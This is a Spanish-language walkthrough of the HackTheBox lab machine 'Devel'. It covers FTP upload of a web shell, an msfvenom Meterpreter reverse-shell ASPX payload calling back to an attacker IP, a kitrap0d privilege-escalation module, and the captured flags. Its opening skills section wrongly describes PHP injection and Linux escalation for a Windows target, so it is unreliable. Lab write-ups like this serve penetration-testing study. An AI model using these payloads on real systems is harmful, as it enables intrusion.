-- -
- Tags: #ejptmachine #webshell #metasploit 
-- --
### ¿Qué habilidades puedes practicar con Devel?

1. **Reconocimiento y escaneo:**
    - El primer paso es realizar un **escaneo de puertos** con **Nmap** para identificar los servicios activos en la máquina.
    - **Devel** incluye un servicio web, lo que te permitirá practicar la **enumeración de directorios** usando herramientas como **Gobuster** o **Dirbuster**.
2. **Explotación de vulnerabilidades web:**
    - El principal enfoque de la máquina está en la explotación de una vulnerabilidad en una **aplicación web**.
    - Devel involucra una **inyección de comandos** o una **inyección de PHP** a través de un formulario web vulnerable, que es una técnica bastante común en **pentests web**.
3. **Escalada de privilegios en Linux:**
    - Después de obtener acceso inicial al sistema, tendrás que realizar una **escalada de privilegios**. La máquina te dará la oportunidad de identificar configuraciones incorrectas de **permisos de archivos**, **configuraciones de sudo** u otras vulnerabilidades de escalada de privilegios en **Linux**.

----

`nmap -p- --min-rate 5000 -sCV -n 10.10.10.5 -oN portScan`
![Pasted image 20241130202037](../../Fotos/Pasted%20image%2020241130202037.png)
![Pasted image 20241130202328](../../Fotos/Pasted%20image%2020241130202328.png)

![Pasted image 20241130202545](../../Fotos/Pasted%20image%2020241130202545.png)
![Pasted image 20241130202859](../../Fotos/Pasted%20image%2020241130202859.png)

![Pasted image 20241130202954](../../Fotos/Pasted%20image%2020241130202954.png)
![Pasted image 20241130203029](../../Fotos/Pasted%20image%2020241130203029.png)
![Pasted image 20241130203046](../../Fotos/Pasted%20image%2020241130203046.png)
- Tenemos acceso a 2 de las 3 direcciones que indica el acceso ftp

Como tenemos  acceso a la conexion ftp podemos cargar archivos con PUT, si cargamos un archivo podríamos verlo en la web como una dirección y ejecutarse.

*Web shell*

![Pasted image 20241130203649](../../Fotos/Pasted%20image%2020241130203649.png)

![Pasted image 20241130203930](../../Fotos/Pasted%20image%2020241130203930.png)

![Pasted image 20241130204117](../../Fotos/Pasted%20image%2020241130204117.png)

`Maquina Vulnera`

---

**METODO 1**

*Acceso CLI*
- Existen varias formas.


`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=443 -f aspx > met_rev_443.aspx`
![Pasted image 20241130205053](../../Fotos/Pasted%20image%2020241130205053.png)

![Pasted image 20241130205139](../../Fotos/Pasted%20image%2020241130205139.png)

![Pasted image 20241130205343](../../Fotos/Pasted%20image%2020241130205343.png)

![Pasted image 20241130205406](../../Fotos/Pasted%20image%2020241130205406.png)

Visitamos
![Pasted image 20241130205435](../../Fotos/Pasted%20image%2020241130205435.png)
-  Opción `curl http://10.10.10.5/met_rev_443.aspx`
- La idea es generar ejecución simplemente ya sea por curl o visitando la web

Ya tenemos acceso CLI
![Pasted image 20241130205449](../../Fotos/Pasted%20image%2020241130205449.png)

![Pasted image 20241130205545](../../Fotos/Pasted%20image%2020241130205545.png)

![Pasted image 20241130205611](../../Fotos/Pasted%20image%2020241130205611.png)

---

*Escalada de privilegios*
F1: 
![Pasted image 20241130205950](../../Fotos/Pasted%20image%2020241130205950.png)

exploit/windows/local/ms10_015_kitrap0d
![Pasted image 20241130210356](../../Fotos/Pasted%20image%2020241130210356.png)

![Pasted image 20241130215030](../../Fotos/Pasted%20image%2020241130215030.png)

![Pasted image 20241130215052](../../Fotos/Pasted%20image%2020241130215052.png)

![Pasted image 20241130215222](../../Fotos/Pasted%20image%2020241130215222.png)

User flag: ba979699455143ec535fd3a75d2d1565

![Pasted image 20241130215327](../../Fotos/Pasted%20image%2020241130215327.png)

Root flag: 630523683f9e4cb3e433784650920893

**Fin Metodo 1**

----
**Metodo 2**

nc.exe


